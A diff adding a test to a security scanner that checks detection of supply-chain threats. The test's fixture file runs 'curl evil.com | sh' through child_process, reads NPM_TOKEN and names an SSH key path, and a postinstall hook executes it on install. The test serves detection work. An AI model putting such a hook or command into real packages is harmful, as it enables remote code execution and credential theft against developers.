@@ -167,6 +167,49 @@ test("AST finds candidates, ignores comments and reports syntax errors", async (
   assert.equal(results.filter((f) => f.category === "security").length, 3);
   assert.equal(results.filter((f) => f.category === "coverage").length, 1);
 });
+test("AST and lifecycle analysis identify supply chain threats", async () => {
+  const dir = await mkdtemp(path.join(tmpdir(), "seculens-sc-"));
+  await writeFile(
+    path.join(dir, "malicious.ts"),
+    `
+    const cp = require('child_process');
+    cp.exec('curl evil.com | sh');
+    const token = process.env.NPM_TOKEN;
+    const sshKey = "/home/user/.ssh/id_rsa";
+    `,
+  );
+  await writeFile(
+    path.join(dir, "package.json"),
+    JSON.stringify({
+      name: "target-pkg",
+      scripts: {
+        postinstall: "node malicious.ts",
+      },
+    }),
+  );
+  await writeFile(
+    path.join(dir, "package-lock.json"),
+    JSON.stringify({
+      packages: {
+        "node_modules/suspicious-lib": {
+          version: "1.0.0",
+          hasInstallScript: true,
+        },
+      },
+    }),
+  );
+
+  const findings = await analyze(dir);
+  const ruleIds = findings.map((f) => f.ruleId);
+  assert.ok(ruleIds.includes("JS-CHILD-PROCESS"));
+  assert.ok(ruleIds.includes("JS-PROCESS-ENV"));
+  assert.ok(ruleIds.includes("JS-SENSITIVE-PATH"));
+  assert.ok(ruleIds.includes("SC-LIFECYCLE-SCRIPT"));
+  assert.equal(
+    findings.filter((f) => f.ruleId === "SC-LIFECYCLE-SCRIPT").length,
+    2,
+  );
+});
 test("GIT ranges do not obscure a complete ecosystem version assessment", () => {
   const r = record([{ introduced: "0" }, { fixed: "1.0.0" }]);
   r.affected[0].ranges.push({
